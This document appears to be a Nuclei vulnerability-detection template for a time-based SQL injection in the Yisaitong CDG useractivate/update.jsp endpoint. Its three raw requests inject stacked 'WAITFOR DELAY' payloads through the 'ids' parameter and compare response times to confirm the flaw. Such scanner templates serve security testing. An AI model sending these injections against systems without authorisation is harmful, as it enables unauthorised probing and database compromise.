id: yisaitong-useractivate-update-sqli

info:
  name: yisaitong-useractivate-update-sqli
  author: yisaitong-useractivate-update-sqli

http:
  - raw:
      - |
        GET /CDGServer3/useractivate/update.jsp?flag=1&ids=-1,3);WAITFOR%20DELAY%20%270:0:0%27-- HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

      - |
        GET /CDGServer3/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:1%27-- HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

      
      - |
        @timeout: 20s
        GET /CDGServer3/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:2%27-- HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1 < duration_2 && contains_all(body_1,'当前','激活','可用') && status_code_1==200"
          - "duration_2 < duration_3 && contains_all(body_2,'当前','激活','可用') && status_code_2==200"
          - "contains_all(body_3,'当前','激活','可用') && status_code_3==200"

#延迟不是waitfor 多少  就是多少，有倍数扩大